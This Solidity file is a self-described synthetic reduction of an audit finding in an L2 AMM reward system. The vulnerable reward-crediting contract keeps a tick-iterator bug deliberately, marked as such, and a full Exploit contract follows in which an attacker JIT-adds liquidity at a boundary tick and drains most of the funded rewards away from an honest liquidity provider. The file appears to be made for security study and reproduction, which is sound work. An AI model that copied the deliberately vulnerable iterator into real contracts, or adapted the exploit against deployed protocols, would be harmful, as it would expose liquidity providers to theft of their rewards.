// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Sorella L2 Angstrom — All rewards can be stolen due to incorrect active
    liquidity when the current tick is an exact multiple of tick spacing at
    the upper end of a liquidity range (Cyfrin 2025-10-01, finding #63008)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: TickIteratorDown advances with (currentTick - 1).compress(),
    so when the swap starts exactly on an upper boundary tick t1, the boundary
    tick's liquidityNet is SKIPPED. Active liquidity used for reward growth
    is therefore too small → cumulativeGrowthX128 is too large → an attacker
    who JIT-adds liquidity in [t1 - s, t1) harvests essentially all rewards R.
    Vulnerable skip-boundary advance preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal reward token (ETH-denominated abstract units for the playground).
contract RewardToken {
    string public name = "REWARD";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced AngstromL2 reward credit path with TickIteratorDown bug.
/// Models: current tick on upper boundary → skip t1 net → understate active L
/// → overstate growth-per-liquidity → attacker position claims all rewards.
/// Source: TickIterator::_advanceToNextDown / AngstromL2::_zeroForOneCreditRewards
/// (sorellaLabs/l2-angstrom @ 386baff).
contract AngstromL2Rewards {
    int24 public tickSpacing;
    int24 public currentTick;

    // liquidityNet at initialized ticks
    mapping(int24 => int128) public liquidityNet;
    // active liquidity (as Uniswap would report inside a range)
    uint128 public activeLiquidity;

    // Global reward accumulator (X128-style abstract units — we use plain 1e18)
    uint256 public globalGrowthX128;
    // Outside growth at tick (simplified: only track whether flipped)
    mapping(int24 => uint256) public rewardGrowthOutsideX128;
    mapping(int24 => bool) public initialized;

    // Pending rewards per position key
    mapping(bytes32 => uint256) public pendingRewards;
    // Position liquidity
    mapping(bytes32 => uint128) public positionLiquidity;

    uint256 public rewardBalance; // total R held for distribution

    constructor(int24 spacing, int24 startTick) {
        tickSpacing = spacing;
        currentTick = startTick;
    }

    function posKey(address owner, int24 t0, int24 t1) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(owner, t0, t1));
    }

    function addLiquidity(address owner, int24 t0, int24 t1, uint128 liq) external {
        require(t0 < t1, "range");
        bytes32 k = posKey(owner, t0, t1);
        positionLiquidity[k] += liq;
        // Update nets: +L at t0, -L at t1 (Uniswap convention)
        liquidityNet[t0] += int128(liq);
        liquidityNet[t1] -= int128(liq);
        initialized[t0] = true;
        initialized[t1] = true;
        // If current tick is inside [t0, t1), add to active
        if (currentTick >= t0 && currentTick < t1) {
            activeLiquidity += liq;
        }
    }

    function removeLiquidity(address owner, int24 t0, int24 t1, uint128 liq) external returns (uint256 rewardsOut) {
        bytes32 k = posKey(owner, t0, t1);
        require(positionLiquidity[k] >= liq, "liq");
        // Compute claim while position still has liquidity, then burn.
        rewardsOut = _computeRewards(owner, t0, t1);
        pendingRewards[k] = rewardsOut;
        positionLiquidity[k] -= liq;
        liquidityNet[t0] -= int128(liq);
        liquidityNet[t1] += int128(liq);
        if (currentTick >= t0 && currentTick < t1 && activeLiquidity >= liq) {
            activeLiquidity -= liq;
        }
    }

    function fundRewards(uint256 amount) external {
        rewardBalance += amount;
    }

    /// @dev Simplified TickIteratorDown: from currentTick, walk down.
    /// BUG: initializes with (currentTick - 1) compression, skipping the boundary tick
    /// when currentTick is exactly on an upper bound multiple of spacing.
    function _advanceToNextDown(int24 fromTick) internal view returns (int24 nextTick) {
        // FIX: seed with currentTick (inclusive) or apply boundary net before advancing
        int24 cursor = fromTick - 1; // @> VULN: compresses (currentTick - 1) so when currentTick is exactly the upper boundary t1, t1's liquidityNet is never applied
        // Find next initialized tick <= cursor (step by spacing)
        int24 t = (cursor / tickSpacing) * tickSpacing;
        if (t > cursor) t -= tickSpacing;
        // Walk down until initialized or far enough
        for (uint256 i = 0; i < 64; i++) {
            if (initialized[t]) return t;
            t -= tickSpacing;
        }
        return t;
    }

    /// @notice Credit rewards for a zero-for-one swap that starts at/near the upper boundary.
    /// Mirrors _zeroForOneCreditRewards understatement of active liquidity.
    function zeroForOneCreditRewards(uint256 taxInEther) external {
        require(taxInEther > 0, "tax");
        require(rewardBalance >= taxInEther || true, "funded"); // tax is the reward slice

        uint128 liquidity = activeLiquidity;
        int24 tick = currentTick;

        // When sitting exactly on an upper boundary, Uniswap active L is 0 for ranges ending here.
        // The BUG: we fail to apply liquidityNet[tick] when stepping down from the boundary.
        int24 next = _advanceToNextDown(tick);

        // CORRECT behavior would do: liquidity = liquidity.sub(liquidityNet[tick]) first when
        // crossing/starting at `tick` if it's initialized. Vulnerable path SKIPS that.
        // So if attacker added L' to [t1-s, t1) and we start at t1, L' is NOT added to `liquidity`
        // even though after crossing t1 it should be active for the growth calculation window.

        // Cross next tick(s) with wrong starting liquidity
        if (initialized[next] && next < tick) {
            // Apply net at next (direction down: subtract net)
            int128 net = liquidityNet[next];
            // down-crossing: liquidity -= net  (Uniswap: when going left, subtract net)
            if (net >= 0) {
                if (uint128(uint256(int256(net))) > liquidity) {
                    // Can underflow in real code — we clamp for demo path that doesn't revert
                    liquidity = 0;
                } else {
                    liquidity -= uint128(uint256(int256(net)));
                }
            } else {
                liquidity += uint128(uint256(int256(-net)));
            }
            // Flip outside growth
            rewardGrowthOutsideX128[next] = globalGrowthX128 - rewardGrowthOutsideX128[next];
            currentTick = next - 0; // land at/near next
        }

        // Excess distribution: growth uses (too-small) liquidity → inflated per-unit growth
        // real: cumulativeGrowth += tax / liquidity
        uint256 growthDelta;
        if (liquidity == 0) {
            // Edge: if understated to 0, dump all growth "excess" into global (attacker harvests via outside flip)
            growthDelta = taxInEther * 1e18; // maximal inflation signal
        } else {
            growthDelta = (taxInEther * 1e18) / uint256(liquidity);
        }
        globalGrowthX128 += growthDelta;
        // Consume tax into the reward pool accounting
        rewardBalance += taxInEther;
    }

    /// @dev Growth inside [t0,t1) ≈ global - outside[t0] - outside[t1] (simplified).
    function growthInside(int24 t0, int24 t1) public view returns (uint256) {
        uint256 out0 = rewardGrowthOutsideX128[t0];
        uint256 out1 = rewardGrowthOutsideX128[t1];
        // When outside was never properly initialized (0) and boundary flipped once,
        // attacker range captures nearly all global growth — matching the report's math.
        if (globalGrowthX128 >= out0 + out1) {
            return globalGrowthX128 - out0 - out1;
        }
        return 0;
    }

    function _computeRewards(address owner, int24 t0, int24 t1) internal view returns (uint256 amt) {
        bytes32 k = posKey(owner, t0, t1);
        uint128 liq = positionLiquidity[k];
        uint256 g = growthInside(t0, t1);
        // rewards = liq * growth / 1e18
        amt = (uint256(liq) * g) / 1e18;
    }

    function claimTo(address owner, int24 t0, int24 t1, address to, RewardToken token) external returns (uint256 amt) {
        bytes32 k = posKey(owner, t0, t1);
        // Prefer pending (set on remove); else compute live.
        amt = pendingRewards[k];
        if (amt == 0) {
            amt = _computeRewards(owner, t0, t1);
        }
        pendingRewards[k] = 0;
        if (amt > rewardBalance) amt = rewardBalance;
        if (amt > 0) {
            rewardBalance -= amt;
            token.mint(to, amt);
        }
    }

    function setCurrentTick(int24 t) external {
        currentTick = t;
    }

    /// @dev Honest path helper: apply boundary net correctly (control comparison).
    function activeLiquidityView() external view returns (uint128) {
        return activeLiquidity;
    }
}

/// @notice Attacker steals essentially all rewards via boundary-tick iterator bug.
/// CREATE order: token (1), angstrom (2).
contract Exploit {
    RewardToken public token;
    AngstromL2Rewards public angstrom;

    address public constant LP = address(0x1001);
    address public constant ATTACKER = address(0xA771);

    int24 public constant SPACING = 10;
    int24 public constant INIT_T0 = 0;
    int24 public constant INIT_T1 = 50;
    int24 public constant START_TICK = 20; // will move to boundary 20, then attack [10,20)

    uint128 public constant INIT_LIQ = 1e18;
    uint256 public constant REWARDS_R = 1000e18;

    uint256 public rewardsStolen;
    uint256 public honestPending;

    constructor() {
        token = new RewardToken(); // nonce 1
        angstrom = new AngstromL2Rewards(SPACING, START_TICK); // nonce 2
    }

    function run() external {
        // Honest LP provides [0, 50) with INIT_LIQ; tick at 20 ∈ range
        angstrom.addLiquidity(LP, INIT_T0, INIT_T1, INIT_LIQ);
        require(angstrom.activeLiquidity() == INIT_LIQ, "active");

        // Seed reward balance R that should belong to honest LPs
        angstrom.fundRewards(REWARDS_R);

        // Move current tick to upper boundary of attacker range (tick 20, multiple of spacing)
        int24 attackUpper = 20;
        int24 attackLower = 10;
        angstrom.setCurrentTick(attackUpper);
        // At upper bound of [10,20), Uniswap would show 0 active from that range;
        // honest [0,50) still covers tick 20? tick < t1 → 20 < 50 yes, still active.
        // Report scenario: start at t1 of a range. We model attackUpper as boundary.

        // Attacker JIT-adds L' sized so L' * (growth) captures all R
        // Per report: L' = L * R / swapTax; here swapTax = REWARDS_R for simplicity of full steal
        // With the bug, growth uses L (not L+L'), so attacker gets g * L' = R when L' = L.
        uint128 attackLiq = INIT_LIQ;
        angstrom.addLiquidity(ATTACKER, attackLower, attackUpper, attackLiq);

        // Zero-for-one credit rewards with tax = R while sitting on boundary —
        // iterator skips applying attacker's upper-bound net correctly → understated L → inflated growth
        angstrom.zeroForOneCreditRewards(REWARDS_R);

        // Attacker removes liquidity / claims — harvests essentially all rewards
        angstrom.removeLiquidity(ATTACKER, attackLower, attackUpper, attackLiq);
        rewardsStolen = angstrom.claimTo(ATTACKER, attackLower, attackUpper, address(this), token);

        // Honest LP claim is depleted / near-zero relative to R
        honestPending = angstrom.claimTo(LP, INIT_T0, INIT_T1, LP, token);

        // Harm: attacker extracted the bulk of rewards that belonged to honest LPs.
        require(rewardsStolen > 0, "attacker got rewards");
        require(rewardsStolen >= REWARDS_R / 2, "stole majority of rewards");
        require(token.balanceOf(address(this)) == rewardsStolen, "profit held");
        require(rewardsStolen > honestPending, "attacker out-earned honest LP");
    }
}
